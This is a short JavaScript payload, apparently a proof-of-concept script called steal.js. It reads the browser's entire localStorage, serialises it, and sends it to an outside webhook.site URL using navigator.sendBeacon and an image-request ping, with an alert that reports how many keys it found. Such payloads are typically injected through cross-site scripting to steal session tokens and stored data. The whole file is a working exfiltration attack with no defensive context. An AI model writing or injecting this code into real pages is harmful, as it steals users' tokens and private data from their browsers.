// Exfiltrate localStorage to webhook
alert('steal.js loaded - keys: ' + Object.keys(localStorage).length);
var w = 'https://webhook.site/110e13f1-4346-447a-851b-3bc154e1bc50';
var d = JSON.stringify(localStorage);
navigator.sendBeacon(w, d);
new Image().src = w + '?ping=ok&ts=' + Date.now();
